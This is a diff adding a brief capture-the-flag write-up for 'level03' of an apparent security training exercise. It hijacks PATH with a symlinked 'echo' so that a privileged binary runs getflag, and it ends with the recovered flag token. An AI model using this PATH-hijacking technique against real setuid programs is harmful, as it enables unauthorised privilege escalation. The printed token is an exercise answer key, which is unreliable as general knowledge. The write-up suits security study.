@@ -1,0 +1,23 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██████╗ ██████╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔═████╗╚════██╗
+██║     █████╗  ██║   ██║█████╗  ██║         ██║██╔██║ █████╔╝
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ████╔╝██║ ╚═══██╗
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚██████╔╝██████╔╝
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═════╝ ╚═════╝
+
+strings level03
+-> /usr/bin/env echo Exploit me
+
+The program is calling the echo command using /usr/bin/env, so we can use the symlink exploit.
+
+Create a symbolic link from echo to getflag and place it in /tmp folder:
+ln -s /bin/getflag /tmp/echo
+
+Add /tmp directory to PATH:
+export PATH=/tmp:$PATH
+
+./level03
+                                |═══════════════════════════|
+Check flag.Here is your token : | qi0maab88jeaj46qoumi7maus |
+                                |═══════════════════════════|
